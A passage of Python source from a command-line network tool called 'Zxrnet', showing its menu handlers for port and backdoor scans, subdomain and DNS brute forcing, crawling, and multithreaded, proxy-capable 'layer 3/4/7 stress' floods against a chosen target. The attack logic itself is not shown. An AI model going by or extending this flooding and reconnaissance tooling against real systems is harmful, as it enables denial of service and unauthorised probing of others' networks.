                    target = self.get_user_input("Target IP", None)
                    if not self.validate_ip(target):
                        print(colored("[-] Invalid IP!", "red", attrs=["bold"]))
                        continue
                    port_range_input = self.get_user_input("Port range (start-end)", "1-1000")
                    port_range = self.validate_port_range(port_range_input)
                    if not port_range:
                        continue
                    threads = int(self.get_user_input("Number of threads", str(self.config["settings"]["threads"])) or self.config["settings"]["threads"])
                    self.scan_ports(target, port_range, threads)

                elif choice == "5":
                    target = self.get_user_input("Target IP", None)
                    if not self.validate_ip(target):
                        print(colored("[-] Invalid IP!", "red", attrs=["bold"]))
                        continue
                    threads = int(self.get_user_input("Number of threads", str(self.config["settings"]["threads"])) or self.config["settings"]["threads"])
                    self.scan_backdoors(target, threads)

                elif choice == "6":
                    scan_type = self.get_user_input("Scan single file (1) or system (2)", None)
                    if scan_type == "1":
                        file_path = self.get_user_input("File path", None)
                        self.scan_virus(file_path)
                    elif scan_type == "2":
                        self.scan_virus()
                    else:
                        print(colored("[-] Invalid choice!", "red", attrs=["bold"]))

                elif choice == "7":
                    target = self.get_user_input("Target URL", None)
                    duration = int(self.get_user_input("Duration (seconds)", "60"))
                    threads = int(self.get_user_input("Number of threads", "200"))
                    use_proxies = self.get_user_input("Use proxies? (y/n)", "y").lower() in ["", "y"]
                    self.layer7_stress(target, duration, threads, use_proxies)

                elif choice == "8":
                    target = self.get_user_input("Target IP", None)
                    if not self.validate_ip(target):
                        print(colored("[-] Invalid IP!", "red", attrs=["bold"]))
                        continue
                    port = self.get_user_input("Target Port", None)
                    if not self.validate_port(port):
                        continue
                    port = int(port)
                    protocol = self.get_user_input("Protocol (tcp/udp)", "tcp").lower()
                    if protocol not in ["tcp", "udp"]:
                        print(colored("[-] Invalid protocol!", "red", attrs=["bold"]))
                        continue
                    duration = int(self.get_user_input("Duration (seconds)", "60"))
                    threads = int(self.get_user_input("Number of threads", "200"))
                    self.layer4_stress(target, port, duration, threads, protocol)

                elif choice == "9":
                    target = self.get_user_input("Target IP", None)
                    if not self.validate_ip(target):
                        print(colored("[-] Invalid IP!", "red", attrs=["bold"]))
                        continue
                    duration = int(self.get_user_input("Duration (seconds)", "60"))
                    threads = int(self.get_user_input("Number of threads", "200"))
                    self.layer3_stress(target, duration, threads)

                elif choice == "10":
                    domain = self.get_user_input("Target domain (e.g., example.com)", None)
                    threads = int(self.get_user_input("Number of threads", "100"))
                    limit = int(self.get_user_input("Max subdomains to check", "20000"))
                    asyncio.run(self.enumerate_subdomains(domain, threads, limit))

                elif choice == "11":
                    domain = self.get_user_input("Target domain (e.g., example.com)", None)
                    record_types = self.get_user_input("Record types (e.g., A,MX,NS,TXT)", "A,MX,NS,TXT").split(",")
                    self.dns_bruteforce(domain, record_types)

                elif choice == "12":
                    url = self.get_user_input("Target URL (e.g., example.com)", None)
                    max_depth = int(self.get_user_input("Max depth", "2"))
                    threads = int(self.get_user_input("Number of threads", "50"))
                    asyncio.run(self.web_crawler(url, max_depth, threads))

                elif choice == "13":
                    ip = self.get_user_input("Target IP", None)
                    self.ip_geolocation(ip)

                elif choice == "14":
                    print(colored("[+] Exiting Zxrnet...", "green", attrs=["bold"]))
                    self.save_config()
                    self.open_exit_link()
                    sys.exit(0)

                else:
                    print(colored("[-] Invalid option!", "red", attrs=["bold"]))

            except ValueError as e:
                print(colored(f"[-] Input error: {e}", "red", attrs=["bold"]))
            except Exception as e:
                logging.error(f"Unexpected error: {e}")
                print(colored(f"[-] Unexpected error: {e}", "red", attrs=["bold"]))

            input(colored("[>] Press Enter to continue...", "yellow", attrs=["bold"]))
            self.clear_screen()

if __name__ == "__main__":
    print(colored("[*] Starting Zxrnet...", "green", attrs=["bold"]))
    tool = Zxrnet()
    tool.run()